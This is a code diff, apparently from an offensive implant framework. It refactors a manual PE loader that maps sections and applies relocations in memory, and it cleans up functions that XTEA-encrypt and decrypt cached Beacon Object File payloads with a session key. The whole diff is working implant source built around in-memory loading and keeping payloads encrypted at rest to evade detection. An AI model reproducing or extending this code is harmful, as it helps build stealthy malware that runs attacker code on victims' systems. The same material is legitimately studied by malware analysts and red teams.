@@ -293,13 +293,16 @@ namespace Objects {
     BOOL MapSections(PLOADMODULE module) {
         HEXANE;
 
-        auto image      = CreateImageData(module->buffer);
-        auto region_size = (size_t) image->nt_head->OptionalHeader.SizeOfImage;
+        auto image          = CreateImageData(module->buffer);
+        auto region_size    = (size_t) image->nt_head->OptionalHeader.SizeOfImage;
 
-        module->base = image->nt_head->OptionalHeader.ImageBase;
+        auto nt_head        = image->nt_head;
+        auto pref_base      = image->nt_head->OptionalHeader.ImageBase;
+
+        module->base = pref_base;
 
         if (!NT_SUCCESS(ntstatus = ctx->memapi.NtAllocateVirtualMemory(NtCurrentProcess(), (PVOID*) &module->base, 0, &region_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)) ||
-            module->base != image->nt_head->OptionalHeader.ImageBase) {
+            module->base != pref_base) {
 
             module->base = 0;
             region_size = image->nt_head->OptionalHeader.SizeOfImage;
@@ -309,21 +312,22 @@ namespace Objects {
             }
         }
 
-        for (DWORD i = 0; i < image->nt_head->OptionalHeader.SizeOfHeaders; i++) {
+        for (DWORD i = 0; i < nt_head->OptionalHeader.SizeOfHeaders; i++) {
             B_PTR(module->base)[i] = module->buffer[i];
         }
 
-        for (DWORD i = 0; i < image->nt_head->FileHeader.NumberOfSections; i++, image->section++) {
+        for (DWORD i = 0; i < nt_head->FileHeader.NumberOfSections; i++, image->section++) {
             for (DWORD j = 0; j < image->section->SizeOfRawData; j++) {
 
                 (B_PTR(module->base + image->section->VirtualAddress))[j] = (module->buffer + image->section->PointerToRawData)[j];
             }
         }
 
-        ULONG_PTR base_offset           = module->base - image->nt_head->OptionalHeader.ImageBase;
-        PIMAGE_DATA_DIRECTORY relocdir  = &image->nt_head->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
+        ULONG_PTR base_offset           = module->base - pref_base;
+        PIMAGE_DATA_DIRECTORY relocdir  = &nt_head->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
 
-        if ((module->base - image->nt_head->OptionalHeader.ImageBase) && relocdir) {
+        // if non-zero rva and relocdir exists...
+        if ((module->base - pref_base) && relocdir) {
             PIMAGE_BASE_RELOCATION reloc = RVA(PIMAGE_BASE_RELOCATION, module->base, relocdir->VirtualAddress);
 
             do {
@@ -384,12 +388,12 @@ namespace Objects {
     VOID AddCoff(_coff_params *coff) {
         HEXANE;
 
-        _coff_params *head = ctx->bof_cache;
+        PCOFF_PARAMS head = ctx->bof_cache;
 
         if (ENCRYPTED) {
-            XteaCrypt((uint8_t*) coff->data, coff->data_size, ctx->config.session_key, true);
-            XteaCrypt((uint8_t*) coff->args, coff->args_size, ctx->config.session_key, true);
-            XteaCrypt((uint8_t*) coff->entrypoint, coff->entrypoint_length, ctx->config.session_key, true);
+            XteaCrypt(B_PTR(coff->data), coff->data_size, ctx->config.session_key, true);
+            XteaCrypt(B_PTR(coff->args), coff->args_size, ctx->config.session_key, true);
+            XteaCrypt(B_PTR(coff->entrypoint), coff->entrypoint_length, ctx->config.session_key, true);
         }
 
         if (!ctx->bof_cache) {
@@ -419,9 +423,9 @@ namespace Objects {
             if (head) {
                 if (head->bof_id == bof_id) {
                     if (ENCRYPTED) {
-                        XteaCrypt((uint8_t*)head->data, head->data_size, ctx->config.session_key, false);
-                        XteaCrypt((uint8_t*)head->args, head->args_size, ctx->config.session_key, false);
-                        XteaCrypt((uint8_t*)head->entrypoint, head->entrypoint_length, ctx->config.session_key, false);
+                        XteaCrypt(B_PTR(head->data), head->data_size, ctx->config.session_key, false);
+                        XteaCrypt(B_PTR(head->args), head->args_size, ctx->config.session_key, false);
+                        XteaCrypt(B_PTR(head->entrypoint), head->entrypoint_length, ctx->config.session_key, false);
                     }
 
                     return head;
